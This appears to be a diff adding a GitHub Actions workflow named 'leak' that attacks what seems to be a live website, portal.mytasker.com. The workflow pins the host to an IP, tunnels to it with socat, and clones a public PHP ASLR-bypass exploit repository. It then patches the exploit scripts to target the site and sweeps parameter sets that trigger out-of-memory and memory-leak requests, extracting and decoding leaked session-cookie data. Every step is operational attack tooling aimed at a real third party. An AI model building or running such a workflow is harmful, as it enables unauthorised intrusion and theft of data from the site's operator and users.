@@ -1,0 +1,39 @@
+name: leak
+on:
+  workflow_dispatch:
+    inputs:
+      sets:
+        description: "semicolon list of F,S,NB,BL,X,K,KL,FL"
+        default: "0,62,10,4000000,208,0,4000,103;0,62,20,4000000,208,0,,103;0,62,40,2000000,208,0,4000,103"
+
+jobs:
+  leak:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: setup tunnel
+        run: |
+          sudo sh -c 'echo "69.49.247.128 portal.mytasker.com" >> /etc/hosts'
+          sudo apt-get -qq update && sudo apt-get -qq install -y socat >/dev/null
+          sudo nohup socat TCP-LISTEN:8088,fork,reuseaddr OPENSSL:portal.mytasker.com:443 >/tmp/socat.log 2>&1 &
+          sleep 2
+          git clone -q https://github.com/9bie/php2shell-bypass-aslr-exp /tmp/p
+          sed -i 's/PHPSESSID/ci_session/g; s/Host: 127.0.0.1:8088/Host: portal.mytasker.com/' /tmp/p/tools/send_a_oom5.py /tmp/p/tools/send_b_leak.py /tmp/p/tools/decode_leak.py
+          grep -n "Host:" /tmp/p/tools/send_a_oom5.py
+      - name: sweep
+        run: |
+          cd /tmp/p/tools
+          IFS=';' ; i=0
+          for s in ${{ inputs.sets }}; do
+            i=$((i+1)); echo "=== set $i: $s"
+            echo "$s" | tr ',' ' ' | xargs timeout 120 python3 send_a_oom5.py > a.out 2>&1
+            echo "A result: $(tail -2 a.out | tr '\n' ' ')"
+            timeout 60 python3 send_b_leak.py > b.out 2>&1
+            grep -aoE "Set-Cookie: [a-z_]+=[^;]*" b.out | head -1 | cut -c1-80
+            CL=$(grep -aoE "Set-Cookie: ci_session=[^;]*" b.out | head -1 | wc -c)
+            echo "cookie_len=$CL"
+            if [ "$CL" -gt 40 ]; then
+              python3 decode_leak.py b.out 2>&1 | tail -5
+            fi
+            sleep 2
+          done
